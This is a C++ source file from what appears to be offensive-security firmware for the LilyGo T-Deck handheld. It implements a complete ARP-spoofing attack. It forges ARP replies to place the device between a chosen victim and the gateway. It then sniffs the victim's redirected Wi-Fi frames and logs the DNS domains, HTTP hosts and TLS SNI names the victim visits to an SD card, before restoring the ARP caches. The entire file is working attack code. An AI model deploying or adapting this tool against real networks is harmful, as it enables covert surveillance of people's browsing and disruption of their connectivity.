// T-REX — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// arpspoof / as — see arpspoof.h.
//
// ARP-reply injection uses a raw ethernet+ARP frame handed to the STA netif's
// linkoutput(): the WiFi driver encrypts it with the pairwise key, so the frame
// is accepted on WPA2 (esp_wifi_80211_tx would NOT encrypt). Technique mirrors
// Bruce firmware's src/modules/ethernet/ARPoisoner.cpp (AGPL-3.0; NOTICES).

#include "arpspoof.h"

#include <Arduino.h>
#include <WiFi.h>
#include <SD.h>
#include <strings.h>   // strncasecmp
#include <esp_wifi.h>
#include <lwip/etharp.h>
#include <lwip/netif.h>
#include <lwip/tcpip.h>

#include "display_manager.h"
#include "input_handling.h"
#include "lockscreen_manager.h"
#include "network_scanner.h"   // resolveNetTarget()
#include "wifi_sd_guard.h"     // ScopedPromiscPause (GDMA rule)
#include "sdcard_manager.h"    // SD_DIR_ARPSPOOF

extern DisplayManager displayManager;
extern InputHandling  inputHandler;

// ── redirected-traffic capture ────────────────────────────────────────────────
// While poisoning, the victim's uplink frames are addressed to OUR MAC; the AP
// relays them to us DECRYPTED (encrypted with our pairwise key on the last hop).
// We sniff those (from-DS, A1=us, A3=victim) and log what the victim is trying to
// reach (dst IP + DNS query / HTTP host). Frame offsets mirror isoscan's isoCapCb.
#define AS_CAP_RING 16
#define AS_CAP_MAX  400   // large enough to reach the TLS SNI in a ClientHello
struct AsCapFrame { uint8_t data[AS_CAP_MAX]; uint16_t len; };
static volatile AsCapFrame s_cap[AS_CAP_RING];
static volatile uint8_t    s_capHead = 0, s_capTail = 0;
static volatile bool       s_capOn = false;
static volatile uint32_t   s_capDropped = 0;
static uint8_t s_ourMac[6], s_vicMac[6];

static void IRAM_ATTR asCapCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    if (!s_capOn || t != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t* pk = (wifi_promiscuous_pkt_t*)buf;
    int len = pk->rx_ctrl.sig_len;
    if (len < 40 || len > 2000) return;
    const uint8_t* f = pk->payload;
    if ((f[1] & 0x03) != 0x02) return;                  // from-DS only
    if (memcmp(f + 4,  s_ourMac, 6) != 0) return;       // A1 = us
    if (memcmp(f + 16, s_vicMac, 6) != 0) return;       // A3 = victim
    uint8_t nx = (uint8_t)((s_capHead + 1) % AS_CAP_RING);
    if (nx == s_capTail) { s_capDropped++; return; }
    int n = len > AS_CAP_MAX ? AS_CAP_MAX : len;
    memcpy((void*)s_cap[s_capHead].data, f, n);
    s_cap[s_capHead].len = (uint16_t)n;
    s_capHead = nx;
}

// Extract the SNI hostname from a TLS ClientHello (the domain in an HTTPS
// handshake). `pl` = start of the TCP payload. Walks ClientHello → extensions →
// server_name (type 0x0000). Returns false unless this frame is a ClientHello
// with an SNI within the captured bytes.
static bool tlsSni(const uint8_t* f, int len, int pl, char* out, int osz) {
    int p = pl;
    if (p + 5 > len || f[p] != 0x16) return false;      // TLS handshake record
    int hp = p + 5;                                     // handshake message
    if (hp + 4 > len || f[hp] != 0x01) return false;    // ClientHello
    int q = hp + 4 + 2 + 32;                            // ver(2) + random(32)
    if (q + 1 > len) return false;
    q += 1 + f[q];                                      // session id
    if (q + 2 > len) return false;
    q += 2 + ((f[q] << 8) | f[q+1]);                    // cipher suites
    if (q + 1 > len) return false;
    q += 1 + f[q];                                      // compression methods
    if (q + 2 > len) return false;
    int extEnd = q + 2 + ((f[q] << 8) | f[q+1]); q += 2;
    if (extEnd > len) extEnd = len;
    while (q + 4 <= extEnd) {
        int etype = (f[q] << 8) | f[q+1];
        int elen  = (f[q+2] << 8) | f[q+3];
        int ep = q + 4;
        if (etype == 0x0000) {                          // server_name
            if (ep + 5 > len) return false;
            int nameLen = (f[ep+3] << 8) | f[ep+4];
            int np = ep + 5;
            if (f[ep+2] == 0 && np + nameLen <= len && nameLen > 0) {
                int n = nameLen < osz - 1 ? nameLen : osz - 1;
                for (int i = 0; i < n; i++) out[i] = (char)f[np+i];
                out[n] = '\0';
                return true;
            }
            return false;
        }
        q = ep + elen;
    }
    return false;
}

// Parse one captured frame → dst IP + a human "detail" (DNS domain / HTTP host /
// proto:port). Returns false if not a parseable IPv4 uplink frame.
static bool asParseFrame(const uint8_t* f, int len, IPAddress& dst, char* detail, int dsz) {
    int hl = ((f[0] & 0x8C) == 0x88) ? 26 : 24;   // QoS data → +2
    int eo = hl + 8 + 6;                           // +CCMP(8) +SNAP(6) = ethertype
    if (eo + 2 > len) return false;
    uint16_t et = (uint16_t)((f[eo] << 8) | f[eo + 1]);
    if (et != 0x0800) return false;                // IPv4 only (v1)
    int ip0 = hl + 8 + 8;                          // IP header
    if (ip0 + 20 > len) return false;
    int ihl = (f[ip0] & 0x0F) * 4;
    if (ihl < 20 || ip0 + ihl > len) return false;
    uint8_t proto = f[ip0 + 9];
    dst = IPAddress(f[ip0 + 16], f[ip0 + 17], f[ip0 + 18], f[ip0 + 19]);
    int th = ip0 + ihl;                            // transport header
    detail[0] = '\0';
    if (proto == 17 && th + 8 <= len) {            // UDP
        uint16_t dport = (uint16_t)((f[th + 2] << 8) | f[th + 3]);
        if (dport == 53) {                         // DNS query → pull the domain
            int q = th + 8 + 12;                    // UDP(8) + DNS header(12) = QNAME
            char dom[80]; int o = 0;
            while (q < len && f[q] != 0) {
                int l = f[q++];
                if (l > 63 || q + l > len) { o = 0; break; }
                for (int j = 0; j < l && o < (int)sizeof(dom) - 1; j++) dom[o++] = (char)f[q++];
                if (q < len && f[q] != 0 && o < (int)sizeof(dom) - 1) dom[o++] = '.';
            }
            dom[o] = '\0';
            snprintf(detail, dsz, "DNS %s", o ? dom : "?");
        } else snprintf(detail, dsz, "UDP :%u", dport);
    } else if (proto == 6 && th + 20 <= len) {     // TCP
        uint16_t dport = (uint16_t)((f[th + 2] << 8) | f[th + 3]);
        int thl = ((f[th + 12] >> 4) & 0x0F) * 4;
        int pl = th + thl, pn = len - pl;
        if (dport == 80 && pn > 6) {               // HTTP → find Host:
            char host[64]; host[0] = '\0';
            for (int i = pl; i + 6 < len; i++) {
                if ((f[i]=='H'||f[i]=='h') && !strncasecmp((const char*)f + i, "host:", 5)) {
                    int j = i + 5; while (j < len && f[j] == ' ') j++;
                    int o = 0; while (j < len && f[j] != '\r' && f[j] != '\n' && o < 63) host[o++] = (char)f[j++];
                    host[o] = '\0'; break;
                }
            }
            snprintf(detail, dsz, host[0] ? "HTTP %s" : "HTTP :80", host);
        } else if (dport == 443) {
            char sni[64];
            if (tlsSni(f, len, pl, sni, sizeof(sni))) snprintf(detail, dsz, "HTTPS %s", sni);
            else snprintf(detail, dsz, "HTTPS");
        }
        else snprintf(detail, dsz, "TCP :%u", dport);
    } else snprintf(detail, dsz, "proto %u", proto);
    return true;
}

// ── raw ARP-reply frame (built by byte offset — no packed-struct alignment risk)
// Layout (ETH_PAD_SIZE=0 on ESP32): eth(14) + arp(28) = 42 bytes.
static void asSendArpReply(struct netif* nif,
                           const IPAddress& senderIp, const uint8_t senderMac[6],
                           const IPAddress& targetIp, const uint8_t targetMac[6]) {
    const uint16_t LEN = 42;
    struct pbuf* p = pbuf_alloc(PBUF_RAW, LEN, PBUF_RAM);
    if (!p) return;
    uint8_t* b = (uint8_t*)p->payload;

    memcpy(b + 0, targetMac, 6);          // eth.dest = victim
    memcpy(b + 6, senderMac, 6);          // eth.src  = us (spoofed sender)
    b[12] = 0x08; b[13] = 0x06;           // ethertype = ARP
    b[14] = 0x00; b[15] = 0x01;           // hwtype = Ethernet
    b[16] = 0x08; b[17] = 0x00;           // proto  = IPv4
    b[18] = 0x06;                         // hwlen
    b[19] = 0x04;                         // protolen
    b[20] = 0x00; b[21] = 0x02;           // opcode = REPLY
    memcpy(b + 22, senderMac, 6);         // sender hw
    b[28] = senderIp[0]; b[29] = senderIp[1]; b[30] = senderIp[2]; b[31] = senderIp[3];
    memcpy(b + 32, targetMac, 6);         // target hw
    b[38] = targetIp[0]; b[39] = targetIp[1]; b[40] = targetIp[2]; b[41] = targetIp[3];

    LOCK_TCPIP_CORE();
    if (nif && nif->linkoutput) nif->linkoutput(nif, p);
    UNLOCK_TCPIP_CORE();
    pbuf_free(p);
}

// Resolve a live host's MAC by ARPing it (works for IP / nd# / ns# targets alike:
// we're associated, so a request gets a reply that lwip caches). Polls 'q'.
static bool asResolveMac(struct netif* nif, const IPAddress& ip, uint8_t mac[6]) {
    ip4_addr_t t;
    IP4_ADDR(&t, ip[0], ip[1], ip[2], ip[3]);
    for (int attempt = 0; attempt < 10; attempt++) {
        LOCK_TCPIP_CORE();
        etharp_request(nif, &t);
        UNLOCK_TCPIP_CORE();
        delay(120);
        struct eth_addr* eth = nullptr;
        const ip4_addr_t* ipr = nullptr;
        LOCK_TCPIP_CORE();
        s8_t hit = etharp_find_addr(nif, &t, &eth, &ipr);
        UNLOCK_TCPIP_CORE();
        if (hit >= 0 && eth) { memcpy(mac, eth->addr, 6); return true; }
        if (inputHandler.getKeyboardInput() == 'q') return false;
    }
    return false;
}

static String asMacStr(const uint8_t m[6]) {
    char s[18];
    snprintf(s, sizeof(s), "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
    return String(s);
}

void runArpSpoof(char* args) {
    DisplayManager& dm = displayManager;

    if (WiFi.status() != WL_CONNECTED) {
        dm.clearScreen();
        dm.setTextColor(TFT_RED);
        dm.println("Not connected. Run `cw` first.");
        delay(1800);
        return;
    }

    // Parse: as <victim> [gateway]
    String a = args ? String(args) : "";
    a.trim();
    String vTok = a, gTok = "";
    int sp = a.indexOf(' ');
    if (sp >= 0) { vTok = a.substring(0, sp); gTok = a.substring(sp + 1); gTok.trim(); }

    if (vTok.isEmpty()) {
        dm.clearScreen();
        dm.setTextColor(TFT_YELLOW);
        dm.println("Usage: as <victim> [gateway]");
        dm.setTextColor(TFT_WHITE);
        dm.println("victim = ip | nd# | ns#  (run nd/ns first)");
        dm.println("gateway defaults to the current gateway.");
        delay(2600);
        return;
    }

    IPAddress victimIp, gwIp;
    if (!resolveNetTarget(vTok, victimIp)) {
        dm.clearScreen(); dm.setTextColor(TFT_RED);
        dm.println("Bad victim: " + vTok); delay(1800); return;
    }
    if (!gTok.isEmpty()) {
        if (!resolveNetTarget(gTok, gwIp)) {
            dm.clearScreen(); dm.setTextColor(TFT_RED);
            dm.println("Bad gateway: " + gTok); delay(1800); return;
        }
    } else {
        gwIp = WiFi.gatewayIP();
    }

    if (victimIp == gwIp || victimIp == WiFi.localIP() || gwIp == WiFi.localIP()) {
        dm.clearScreen(); dm.setTextColor(TFT_RED);
        dm.println("Victim must differ from gateway/self.");
        delay(2000); return;
    }

    struct netif* nif = netif_default;
    uint8_t ourMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, ourMac);

    // Resolve both endpoints' real MACs (also confirms they're reachable).
    dm.clearScreen();
    dm.setTextColor(TFT_CYAN);
    dm.println("[ARP::SPOOF] resolving MACs...");
    dm.setTextColor(TFT_WHITE);
    dm.println("victim  " + victimIp.toString());
    dm.println("gateway " + gwIp.toString());

    uint8_t victimMac[6], gwMac[6];
    if (!asResolveMac(nif, victimIp, victimMac)) {
        dm.setTextColor(TFT_RED); dm.println("Victim MAC unresolved (offline?)."); delay(2000); return;
    }
    if (!asResolveMac(nif, gwIp, gwMac)) {
        dm.setTextColor(TFT_RED); dm.println("Gateway MAC unresolved."); delay(2000); return;
    }

    // ── open SD log (BEFORE promiscuous — GDMA rule) ──────────────────────────
    char logPath[48] = {0};
    File logf;
    { int idx = 1;
      do { snprintf(logPath, sizeof(logPath), "%s/%03d.csv", SD_DIR_ARPSPOOF, idx++); }
      while (SD.exists(logPath) && idx < 1000);
      logf = SD.open(logPath, FILE_WRITE);
      if (logf) logf.println("time_ms,dst_ip,detail"); }

    // ── start capture: sniff the victim's uplink the AP relays to us ──────────
    memcpy(s_ourMac, ourMac, 6);
    memcpy(s_vicMac, victimMac, 6);
    s_capHead = s_capTail = 0; s_capDropped = 0;
    esp_wifi_set_promiscuous_rx_cb(asCapCb);
    wifi_promiscuous_filter_t filt; filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);   // stays associated on the AP channel
    s_capOn = true;

    // ── static screen (redrawn on unlock), stats updated in place ─────────────
    const int statY = 124, reachLblY = 144, reachY = 160;
    auto drawStatic = [&]() {
        dm.clearScreen();
        dm.setTextColor(TFT_RED);   dm.setCursor(10, 40);  dm.printText("[ARP::SPOOF]");
        dm.setTextColor(0x7BEF);    dm.setCursor(10, 58);  dm.printText("redirect/DoS - no forwarding (1 radio)");
        dm.setTextColor(0xC618);    dm.setCursor(10, 78);  dm.printText("victim  " + victimIp.toString());
        dm.setCursor(112, 78); dm.printText(asMacStr(victimMac));
        dm.setTextColor(0xC618);    dm.setCursor(10, 92);  dm.printText("gateway " + gwIp.toString());
        dm.setCursor(112, 92); dm.printText(asMacStr(gwMac));
        dm.setTextColor(0x5AEB);    dm.setCursor(10, reachLblY); dm.printText("victim reaching:");
        dm.setTextColor(0x7BEF);    dm.setCursor(10, 214); dm.printText("[q] stop + heal");
    };
    drawStatic();

    uint32_t pkts = 0, captured = 0, lastTx = 0, lastDraw = 0;
    char reach[3][60] = {{0},{0},{0}};
    bool stop = false;
    while (!stop) {
        if (LockScreenManager::getInstance().consumeJustUnlocked()) drawStatic();
        uint32_t now = millis();
        if (now - lastTx >= 1000) {
            lastTx = now;
            asSendArpReply(nif, gwIp,     ourMac, victimIp, victimMac);   // victim: "gateway is us"
            asSendArpReply(nif, victimIp, ourMac, gwIp,     gwMac);       // gateway: "victim is us"
            pkts += 2;
        }
        // drain captured frames → parse → live list + SD log
        while (s_capTail != s_capHead) {
            uint8_t fr[AS_CAP_MAX]; int fl = s_cap[s_capTail].len;
            if (fl > AS_CAP_MAX) fl = AS_CAP_MAX;
            memcpy(fr, (const void*)s_cap[s_capTail].data, fl);
            s_capTail = (uint8_t)((s_capTail + 1) % AS_CAP_RING);
            IPAddress dst; char detail[96];
            if (asParseFrame(fr, fl, dst, detail, sizeof(detail))) {
                captured++;
                memmove(reach[0], reach[1], sizeof(reach[0]));
                memmove(reach[1], reach[2], sizeof(reach[0]));
                snprintf(reach[2], sizeof(reach[2]), "%s %s", dst.toString().c_str(), detail);
                if (logf) { ScopedPromiscPause _; logf.printf("%lu,%s,%s\n",
                            (unsigned long)millis(), dst.toString().c_str(), detail); logf.flush(); }
            }
        }
        if (now - lastDraw >= 400 && !displayManager.isBlocked()) {
            lastDraw = now;
            dm.fillRect(10, statY, SCREEN_WIDTH - 20, 14, TFT_BLACK);
            dm.setCursor(10, statY); dm.setTextColor(TFT_GREEN);
            char line[48];
            snprintf(line, sizeof(line), "POISONING %lu   captured %lu", (unsigned long)pkts, (unsigned long)captured);
            dm.printText(line);
            dm.fillRect(10, reachY, SCREEN_WIDTH - 20, 3 * 14, TFT_BLACK);
            dm.setTextColor(0xFFE0);
            for (int i = 0; i < 3; i++) if (reach[i][0]) { dm.setCursor(10, reachY + i * 14); dm.printText(String(reach[i])); }
        }
        if (inputHandler.getKeyboardInput() == 'q') stop = true;
        delay(15);
    }

    // ── stop capture (before SD close + heal) ─────────────────────────────────
    s_capOn = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    if (logf) logf.close();

    // ── heal: restore real MACs on both ends ──────────────────────────────────
    dm.fillRect(10, statY, SCREEN_WIDTH - 20, 16, TFT_BLACK);
    dm.setCursor(10, statY); dm.setTextColor(TFT_YELLOW); dm.printText("healing caches...");
    for (int i = 0; i < 5; i++) {
        asSendArpReply(nif, gwIp,     gwMac,     victimIp, victimMac);   // gateway is at gwMac
        asSendArpReply(nif, victimIp, victimMac, gwIp,     gwMac);       // victim  is at victimMac
        delay(120);
    }
    dm.fillRect(10, statY, SCREEN_WIDTH - 20, 16, TFT_BLACK);
    dm.setCursor(10, statY); dm.setTextColor(TFT_GREEN); dm.printText("healed - caches restored");
    delay(1000);
    // Leave WiFi initialised + idle (GDMA rule: never WIFI_OFF/disconnect(true)).
}
